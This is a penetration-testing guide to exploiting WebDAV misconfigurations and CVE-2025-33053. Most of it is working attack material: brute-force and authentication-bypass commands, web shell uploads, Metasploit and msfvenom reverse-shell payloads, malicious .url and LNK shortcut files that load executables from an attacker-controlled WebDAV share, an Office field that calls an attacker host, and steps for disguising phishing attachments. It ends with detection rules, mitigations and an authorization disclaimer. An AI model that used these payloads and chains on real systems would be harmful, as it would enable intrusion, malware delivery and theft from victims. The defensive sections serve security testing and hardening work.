# Comprehensive WebDAV Exploitation Methodology: From Reconnaissance to Post-Exploitation

WebDAV (Web Distributed Authoring and Versioning) misconfigurations have been a persistent attack vector, leading to full system compromise in organizations worldwide. This guide provides a complete, practical methodology for testing and exploiting WebDAV vulnerabilities, incorporating real-world techniques used by Advanced Persistent Threat (APT) groups like Stealth Falcon and APT28, with detailed examples from 2025 and 2026 attacks.

---

## Table of Contents
1. [Understanding the WebDAV Attack Surface](#understanding-the-webdav-attack-surface)
2. [Phase 1: Reconnaissance and Discovery](#phase-1-reconnaissance-and-discovery)
3. [Phase 2: Authentication Testing and Bypass](#phase-2-authentication-testing-and-bypass)
4. [Phase 3: File Upload and Web Shell Deployment](#phase-3-file-upload-and-web-shell-deployment)
5. [Phase 4: Client-Side Exploitation (CVE-2025-33053)](#phase-4-client-side-exploitation-cve-2025-33053)
6. [Phase 5: Advanced Attack Chains (2026 Campaigns)](#phase-5-advanced-attack-chains-2026-campaigns)
7. [Testing with Burp Suite](#testing-with-burp-suite)
8. [Detection and Mitigation](#detection-and-mitigation)
9. [Complete Testing Checklist](#complete-testing-checklist)

---

## Understanding the WebDAV Attack Surface

### How WebDAV Exploitation Works

WebDAV extends HTTP to allow file management operations. When misconfigured, attackers can:

1. **Upload malicious files** using PUT or MOVE methods
2. **Execute uploaded code** if script execution is enabled in the web directory
3. **Coerce authentication** from victims by placing WebDAV paths in lure files
4. **Perform DLL side-loading** by setting working directories to WebDAV shares

### The Core Vulnerability Types

| Vulnerability Type | Description | Real-World Example |
|-------------------|-------------|---------------------|
| **Server-side upload** | WebDAV directory allows PUT requests and script execution | Metasploitable 2 `/dav` directory |
| **Authentication bypass** | Unicode bypass in IIS 6.0 WebDAV (CVE-2009-1535) | Legacy IIS servers |
| **Client-side coercion** | Forced authentication via shortcut files (CVE-2025-33053) | Stealth Falcon APT (2025) |
| **DLL side-loading** | Executable loads malicious DLLs from WebDAV share | LNK file variant (2025) |
| **COM hijacking** | Malicious DOC triggers WebDAV to load payloads (CVE-2026-21509) | APT28 campaign (2026) |

---

## Phase 1: Reconnaissance and Discovery

### Step 1: Service Enumeration with Nmap

The first step identifies WebDAV-enabled services and their configurations.

**Basic WebDAV scan:**
```bash
nmap -p 80,443 --script http-webdav-scan,http-enum <target>
```

**Comprehensive scan with method detection:**
```bash
nmap -p 80,443 --script http-methods --script-args http-methods.url-path=/webdav,http-methods.test-all=true <target>
```

**Example output from a vulnerable server:**
```
PORT   STATE SERVICE
80/tcp open  http
| http-methods: 
|   Supported methods: GET HEAD POST PUT DELETE MKCOL COPY MOVE PROPFIND
|   Potentially risky methods: PUT DELETE MKCOL COPY MOVE PROPFIND
|_  WebDAV enabled
```

### Step 2: Directory Discovery with Gobuster

Identify WebDAV directories that may have write permissions.

```bash
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -x .asp,.aspx,.php,.txt
```

**Common WebDAV paths to test:**
- `/webdav`
- `/dav`
- `/remote.php/webdav` (Nextcloud/Owncloud)
- `/exchange` (Microsoft Exchange)
- `/share`

### Step 3: Unicode Bypass Detection (Legacy IIS)

For IIS 6.0 servers, the WebDAV Unicode bypass (CVE-2009-1535) can completely bypass authentication .

**Using Metasploit for detection:**
```bash
msf6 > use auxiliary/scanner/http/dir_webdav_unicode_bypass
msf6 auxiliary(dir_webdav_unicode_bypass) > set RHOSTS 192.168.1.200-254
msf6 auxiliary(dir_webdav_unicode_bypass) > set THREADS 20
msf6 auxiliary(dir_webdav_unicode_bypass) > run
```

**Successful detection output:**
```
[*] Found protected folder http://192.168.1.204:80/printers/ 401
[*] Testing for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.
[*] Found vulnerable WebDAV Unicode bypass target http://192.168.1.204:80/%c0%afprinters/ 207
```

The `%c0%af` sequence represents a Unicode-encoded forward slash that IIS 6.0 incorrectly normalizes, allowing attackers to bypass authentication restrictions.

---

## Phase 2: Authentication Testing and Bypass

### Step 1: Manual Authentication Testing with Cadaver

Cadaver is the standard command-line WebDAV client, similar to FTP clients.

**Connect to WebDAV server:**
```bash
cadaver http://target/webdav
```

**If authentication is required, provide credentials:**
```bash
cadaver http://target/webdav
Authentication required for WebDAV on server `target':
Username: bob
Password: 
dav:/webdav/> 
```

**List contents and test permissions:**
```
dav:/webdav/> ls
Listing collection `/webdav/`: succeeded.
test.txt           1024  Jan 15 10:23
dav:/webdav/> mkcol test_dir
Creating `test_dir`: succeeded.
dav:/webdav/> put test.txt
Uploading test.txt to `/webdav/test.txt`: succeeded.
```

### Step 2: Brute Force Authentication with Hydra

When credentials are unknown, use Hydra for HTTP Basic/Digest authentication brute force .

```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt target http-get /webdav
```

**For Digest authentication:**
```bash
hydra -L users.txt -P passwords.txt target http-head /webdav -m "HEAD"
```

### Step 3: Authentication Bypass via Unicode (IIS 6.0)

If the server is IIS 6.0 with WebDAV, test the Unicode bypass :

**Using curl to test bypass:**
```bash
# Normal request (should return 401 Unauthorized)
curl -X PROPFIND http://target/printers/ -i

# Bypass request (returns 207 Multi-Status if vulnerable)
curl -X PROPFIND "http://target/%c0%afprinters/" -i
```

**Expected vulnerable response:**
```
HTTP/1.1 207 Multi-Status
Content-Type: text/xml
...
<d:multistatus xmlns:d="DAV:">
  <d:response>
    <d:href>http://target/printers/</d:href>
    <d:propstat>...</d:propstat>
```

---

## Phase 3: File Upload and Web Shell Deployment

### Step 1: Automated Testing with DavTest

DavTest systematically identifies which file types can be uploaded and executed on the server .

**Basic test (no authentication):**
```bash
davtest -url http://target/webdav
```

**With authentication:**
```bash
davtest -url http://target/webdav -auth bob:password_123321
```

**With MOVE technique (upload as .txt then rename):**
```bash
davtest -url http://target/webdav -auth bob:password_123321 -move
```

**Automated backdoor deployment:**
```bash
davtest -url http://target/webdav -auth bob:password_123321 -sendbd auto
```

**Example output showing successful exploitation:**
```
Testing DAV connection
Created directory: DavTestDir_Kj3nF2

Sending test files:
.asp -> SUCCESS (executable)
.aspx -> SUCCESS (executable)
.php -> SUCCESS (executable)
.jsp -> FAIL
.html -> SUCCESS (not executable)
.txt -> SUCCESS (not executable)

Sending backdoor (shell.asp) to DavTestDir_Kj3nF2/shell.asp
SUCCESS

NOTE: Backdoor installed at http://target/webdav/DavTestDir_Kj3nF2/shell.asp
```

### Step 2: Manual Web Shell Upload with Cadaver

After identifying executable extensions, upload a web shell manually.

**Connect and navigate:**
```bash
cadaver http://target/webdav
dav:/webdav/> cd DavTestDir_Kj3nF2
```

**Upload ASP shell:**
```
dav:/webdav/DavTestDir_Kj3nF2/> put /usr/share/webshells/asp/cmd.asp
Uploading cmd.asp to `/webdav/DavTestDir_Kj3nF2/cmd.asp`:
Progress: [=============================>] 100.0% of 2048 bytes succeeded.
```

**Upload PHP shell:**
```
dav:/webdav/DavTestDir_Kj3nF2/> put /usr/share/webshells/php/php-reverse-shell.php
```

### Step 3: Web Shell Access and Command Execution

Access the uploaded shell through a web browser.

**URL format:**
```
http://target/webdav/DavTestDir_Kj3nF2/cmd.asp?cmd=dir
```

**If authentication is required for access, provide credentials in the browser or use curl:**
```bash
curl -u bob:password_123321 "http://target/webdav/DavTestDir_Kj3nF2/cmd.asp?cmd=dir"
```

### Step 4: Metasploit WebDAV Upload Module

For more sophisticated compromise, use Metasploit's dedicated WebDAV module.

```bash
msf6 > use exploit/windows/iis/iis_webdav_upload_asp
msf6 exploit(iis_webdav_upload_asp) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(iis_webdav_upload_asp) > set RHOST 172.16.176.54
msf6 exploit(iis_webdav_upload_asp) > set LHOST 172.16.176.56
msf6 exploit(iis_webdav_upload_asp) > set PATH /webdav/test.asp
msf6 exploit(iis_webdav_upload_asp) > exploit
```

**What the module does automatically:**
1. Uploads a .txt file containing the payload
2. Issues a MOVE request to rename to .asp
3. Requests the file to trigger execution
4. Establishes a meterpreter session

---

## Phase 4: Client-Side Exploitation (CVE-2025-33053)

This represents a completely different attack vector where the attacker targets **client workstations** rather than web servers. The vulnerability was exploited in March 2025 by the Stealth Falcon APT group against defense organizations in the Middle East .

### Understanding the Vulnerability

CVE-2025-33053 affects Windows systems with the WebClient service (WebDAV client) enabled. When a user opens a malicious `.url` shortcut file, Windows can be tricked into loading and executing code from an attacker-controlled WebDAV server .

**Affected Windows versions:**
- Windows 10 (1809 – 22H2)
- Windows 11 (21H2 – 23H2)
- Windows Server 2016, 2019, 2022

**CVSS Score:** 8.8 (Important)

### Attack Chain Overview

1. Attacker creates a malicious `.url` file pointing to a WebDAV server
2. The `.url` file is disguised (e.g., `Invoice.pdf.zip`) and delivered via phishing
3. Victim unzips and double-clicks the `.url` file
4. Windows executes `iediagcmd.exe` with working directory set to attacker's WebDAV server
5. The executable loads `route.exe` or other binaries from the WebDAV share
6. Malicious payload executes with the victim's privileges
7. A decoy PDF may open to distract the victim

### Step-by-Step Exploitation

#### Step 1: Set Up the Attacker's WebDAV Server

Use a Python-based WebDAV server for testing .

**Using wsgiDAV:**
```bash
# Install wsgiDAV
pip install wsgiDAV

# Create a directory for the WebDAV share
mkdir webdav_share
cd webdav_share

# Start the WebDAV server
wsgidav --port=80 --host=0.0.0.0 --root=. --auth=anonymous
```

**Using Docker (from CVE-2025-33053 PoC):**
```bash
# Clone the PoC repository
git clone https://github.com/kra1t0/CVE-2025-33053-WebDAV-RCE-PoC-and-C2-Concept.git
cd CVE-2025-33053-WebDAV-RCE-PoC-and-C2-Concept

# Run the setup script (automates Docker and payload creation)
python3 setup_webdav_payload.py
```

#### Step 2: Create the Malicious .URL File

The `.url` file is a simple text file that Windows treats as a shortcut .

**Manual .url file creation:**
```ini
[InternetShortcut]
URL=C:\Windows\System32\CustomShellHost.exe
WorkingDirectory=\\attacker-ip\webdav\
ShowCommand=7
IconIndex=13
IconFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
Modified=20F06BA06D07BD014D
```

**Using Metasploit module (CVE-2025-33053):**
```bash
msf6 > use exploit/windows/fileformat/unc_url_cve_2025_33053
msf6 exploit(unc_url_cve_2025_33053) > set SRVHOST attacker-ip
msf6 exploit(unc_url_cve_2025_33053) > set FOLDER_NAME webdav
msf6 exploit(unc_url_cve_2025_33053) > set FILE_NAME route.exe
msf6 exploit(unc_url_cve_2025_33053) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(unc_url_cve_2025_33053) > set LHOST attacker-ip
msf6 exploit(unc_url_cve_2025_33053) > exploit
```

#### Step 3: Create the Malicious Payload

Place an executable named `route.exe` (or your chosen filename) in the WebDAV root directory. This payload can be a reverse shell, Meterpreter payload, or custom backdoor.

**Generate a Meterpreter payload:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=attacker-ip LPORT=4444 -f exe -o route.exe
```

**Place it in the WebDAV share:**
```bash
cp route.exe webdav_share/
```

#### Step 4: Deliver the Malicious .URL File

The `.url` file is typically zipped and disguised as a legitimate document .

**Creating the delivery ZIP:**
```bash
# Rename the .url file to appear legitimate
mv malicious.url "Important-Document.pdf.url"

# Zip it (Windows may not show the .url extension inside ZIPs)
zip -j "Invoice.pdf.zip" "Important-Document.pdf.url"
```

**Delivery methods observed in the wild:**
- Phishing emails with ZIP attachments
- Malicious links on compromised websites
- Files uploaded to cloud storage and shared

#### Step 5: Trigger and Execute

When the victim double-clicks the `.url` file:
1. Windows opens `iediagcmd.exe` or `CustomShellHost.exe`
2. The working directory is set to the attacker's WebDAV server
3. The executable loads `route.exe` from the WebDAV share
4. The payload executes on the victim's machine

**Stealth Falcon's real-world payload chain:**
1. `route.exe` opens a decoy PDF to distract the victim
2. Background process loads "Horus Agent" (custom C++ backdoor)
3. Backdoor establishes communication with Mythic C2 framework
4. Attacker gains persistent access to the compromised system

### LNK File Variant

Similar to the `.url` attack, LNK (shortcut) files can achieve the same result .

**Creating a malicious LNK file with PowerShell:**
```powershell
# PowerShell script to create LNK file pointing to WebDAV
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut(".\malicious.lnk")
$Shortcut.TargetPath = "C:\Program Files\Internet Explorer\iediagcmd.exe"
$Shortcut.WorkingDirectory = "\\attacker-ip\webdav\"
$Shortcut.Save()
```

The LNK file achieves the same DLL side-loading as the `.url` attack, making it an effective alternative when `.url` files are blocked.

---

## Phase 5: Advanced Attack Chains (2026 Campaigns)

### APT28 Campaign Using CVE-2026-21509

In January 2026, the Russian state-sponsored group APT28 (also tracked as UAC-0001) exploited CVE-2026-21509, a Microsoft Office vulnerability that forces WebDAV requests . This campaign targeted Ukrainian government entities and organizations across the European Union.

**Complete attack chain:**

1. **Initial Access:** Victim receives a malicious DOC file (e.g., `BULLETEN_H.doc`) disguised as Ukrainian government communication

2. **WebDAV Coercion:** Opening the document triggers CVE-2026-21509, forcing a WebDAV request to attacker-controlled server

3. **Payload Download:** The WebDAV request downloads two components:
   - `EhStoreShell.dll` (malicious DLL)
   - `SplashScreen.png` (image with embedded shellcode)

4. **COM Hijacking for Persistence:** The attacker modifies registry CLSID `{D9144DCD-E998-4ECA-AB6A-DCD83CCBA16D}` to point to `EhStoreShell.dll`

5. **Scheduled Task Creation:** Creates `OneDriveHealth` scheduled task to trigger the payload via `explorer.exe`

6. **Process Injection:** `EhStoreShell.dll` injects shellcode from `SplashScreen.png` into `explorer.exe`

7. **C2 Communication:** Covenant framework communicates through legitimate Filen cloud storage domains (`*.filen.io`)

### Testing This Attack Chain

To test similar WebDAV coercion through Office documents:

**Create a test DOC that triggers WebDAV:**
```xml
<!-- Embedded in document.xml or via OLE objects -->
<w:instrText> INCLUDETEXT "\\\\attacker-ip\\webdav\\malicious.rtf" </w:instrText>
```

**Monitor WebDAV requests:**
```bash
# Set up a WebDAV server with logging
wsgidav --port=80 --host=0.0.0.0 --root=. --auth=anonymous --verbose
```

---

## Testing with Burp Suite

Burp Suite is essential for manual WebDAV testing and discovering vulnerabilities that automated tools might miss.

### Step 1: Configure Burp as an Intercepting Proxy

1. Open Burp Suite → Proxy → Options
2. Add a listener on port 8080
3. Configure your browser to use localhost:8080 as proxy

### Step 2: Intercept and Modify WebDAV Requests

Send a request to the target and use Burp's Repeater to test WebDAV methods.

**Testing OPTIONS method to discover supported methods:**
```
OPTIONS /webdav/ HTTP/1.1
Host: target
User-Agent: Mozilla/5.0
Accept: */*
```

**Expected response showing WebDAV methods:**
```
HTTP/1.1 200 OK
Allow: GET, HEAD, POST, PUT, DELETE, MKCOL, COPY, MOVE, PROPFIND
DAV: 1, 2
```

### Step 3: Testing PUT Method

Use Burp Repeater to upload a test file:

```
PUT /webdav/test.txt HTTP/1.1
Host: target
Content-Length: 12
Content-Type: text/plain

Hello World!
```

**If successful, response code 201 Created:**
```
HTTP/1.1 201 Created
Location: http://target/webdav/test.txt
```

### Step 4: Testing MOVE Method (Rename)

First upload as .txt, then rename to executable:

```
MOVE /webdav/test.txt HTTP/1.1
Host: target
Destination: http://target/webdav/test.asp
```

### Step 5: Testing MKCOL (Create Directory)

```
MKCOL /webdav/attacker_dir HTTP/1.1
Host: target
```

### Step 6: Burp Intruder for Extension Fuzzing

Use Intruder to test which file extensions execute on the server:

1. Send a PUT request to Intruder
2. Set payload position in the filename extension: `/webdav/test.§ext§`
3. Load payloads: `asp`, `aspx`, `php`, `jsp`, `html`, `txt`, `cer`, `cgi`
4. Send a GET request to each uploaded file
5. Analyze response codes and content to determine execution

**Intruder payload positions example:**
```
PUT /webdav/test.§asp§ HTTP/1.1
Host: target
Content-Length: 100

<?php system($_GET['cmd']); ?>
```

### Step 7: Testing for CVE-2025-33053 with Burp

When testing client-side exploitation, Burp can help analyze WebDAV traffic:

1. Set up a Burp Collaborator or external server
2. Create a `.url` file pointing to your Collaborator URL
3. Monitor for incoming WebDAV requests when the victim opens the file

---

## Detection and Mitigation

### Detection Strategies

#### Network Detection

Monitor for outbound WebDAV connections, particularly rare or unexpected ones .

**Elastic detection rule for rare WebDAV connections:**
```sql
from logs-endpoint.events.process-*
| where event.category == "process" and process.name == "rundll32.exe"
  and process.command_line like "*DavSetCookie*"
| where destination.domain not in ("www.google.com", "sharepoint.com", "live.net")
```

**Look for WebDAV methods in web server logs:**
- PROPFIND, PUT, MOVE, MKCOL, DELETE
- UNC path patterns: `\\host@443\DavWWWRoot\`

#### Endpoint Detection

Monitor for:
- Creation of `.url` or `.lnk` files in user directories
- WebClient service starting unexpectedly 
- `rundll32.exe` with `DavSetCookie` command line arguments
- Registry modifications to CLSID keys (COM hijacking)
- Scheduled task creation with names like "OneDriveHealth"

### Mitigation Strategies

#### Immediate Actions

1. **Apply Microsoft Patches:**
   - June 2025 cumulative updates address CVE-2025-33053 
   - CISA requires remediation by July 1, 2025 for federal agencies

2. **Disable WebClient Service if not required:**
   ```powershell
   # Stop and disable WebClient service
   Stop-Service WebClient
   Set-Service WebClient -StartupType Disabled
   ```

3. **Block outbound WebDAV via Firewall:**
   ```powershell
   # Create firewall rule to block WebDAV outbound
   New-NetFirewallRule -DisplayName "Block WebDAV Outbound" -Direction Outbound -Action Block -Protocol TCP -RemotePort 80,443 -Program "%SystemRoot%\System32\svchost.exe" -Service WebClient
   ```

4. **Disable automatic client push installation in SCCM** if not required 

#### Long-term Hardening

| Control | Implementation |
|---------|----------------|
| **LDAP signing** | Enable LDAP signing and channel binding to prevent NTLM relay |
| **SMB signing** | Enable SMB signing across the domain |
| **WebDAV hardening** | Configure WebDAV with authentication and restrict write permissions |
| **User training** | Educate users not to open `.url` or `.lnk` files from untrusted sources |
| **Email filtering** | Block ZIP attachments containing `.url` or `.lnk` files |

### Detection Script for CVE-2025-33053 Mitigation

Use this PowerShell script to verify that mitigation measures are applied :

```powershell
function Test-WebDAVMitigation {
    Write-Host "[*] Checking WebDAV mitigation status..." -ForegroundColor Cyan
    
    # Check WebClient service status
    $webclient = Get-Service -Name WebClient -ErrorAction SilentlyContinue
    if ($webclient.Status -eq 'Stopped' -and $webclient.StartType -eq 'Disabled') {
        Write-Host "[+] WebClient service is disabled" -ForegroundColor Green
    } else {
        Write-Host "[-] WebClient service is running or not disabled" -ForegroundColor Red
    }
    
    # Check firewall rule
    $rule = Get-NetFirewallRule -DisplayName "Block WebDAV Outbound" -ErrorAction SilentlyContinue
    if ($rule.Enabled -eq 'True') {
        Write-Host "[+] WebDAV outbound block rule is enabled" -ForegroundColor Green
    } else {
        Write-Host "[-] WebDAV outbound block rule not found or disabled" -ForegroundColor Red
    }
    
    # Check registry hardening
    $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\WebClient\Parameters"
    $basicAuth = Get-ItemProperty -Path $regPath -Name "UseBasicAuth" -ErrorAction SilentlyContinue
    if ($basicAuth.UseBasicAuth -eq 0) {
        Write-Host "[+] WebClient Basic Authentication is disabled" -ForegroundColor Green
    } else {
        Write-Host "[-] WebClient Basic Authentication may be enabled" -ForegroundColor Red
    }
}

Test-WebDAVMitigation
```

---

## Complete Testing Checklist

### Server-Side WebDAV Testing

- [ ] Scan for WebDAV-enabled services with Nmap
- [ ] Enumerate directories with Gobuster
- [ ] Test supported methods with OPTIONS
- [ ] Attempt authentication bypass (Unicode for IIS 6.0)
- [ ] Brute force authentication with Hydra
- [ ] Run DavTest to identify executable extensions
- [ ] Upload web shell with Cadaver
- [ ] Verify command execution via web shell
- [ ] Attempt privilege escalation from web shell
- [ ] Extract sensitive data (hashes, config files)

### Client-Side WebDAV Testing (CVE-2025-33053)

- [ ] Verify WebClient service is enabled on target systems
- [ ] Set up WebDAV server with wsgiDAV
- [ ] Generate malicious `.url` file
- [ ] Create payload executable (Meterpreter reverse shell)
- [ ] Test on Windows 10/11 lab machine
- [ ] Verify execution when `.url` is double-clicked
- [ ] Test LNK file variant
- [ ] Document bypass techniques for security controls

### Burp Suite Testing

- [ ] Intercept and replay WebDAV methods
- [ ] Fuzz file extensions with Intruder
- [ ] Test MOVE method for extension switching
- [ ] Test MKCOL for directory creation
- [ ] Analyze response codes for permission mapping
- [ ] Use Collaborator to detect outbound WebDAV connections

---

## Real-World Attack Timeline References

| Date | Attack | Actor | Technique |
|------|--------|-------|-----------|
| March 2025 | Defense orgs in Middle East | Stealth Falcon | CVE-2025-33053 (.url files)  |
| June 2025 | Microsoft patches CVE-2025-33053 | - | Cumulative update |
| August 2025 | LNK variant documented | Security researchers | LNK + WebDAV side-loading  |
| January 2026 | Ukrainian government targets | APT28 (UAC-0001) | CVE-2026-21509 + WebDAV  |

---

## Important Legal and Ethical Note

The techniques described in this guide are for educational purposes and authorized security testing only. Testing for WebDAV vulnerabilities without explicit written permission from the system owner is illegal in most jurisdictions. Always ensure you have proper authorization before attempting any of these techniques on production systems. Use isolated lab environments like Metasploitable 2, HackTheBox, or locally deployed vulnerable VMs for practice.
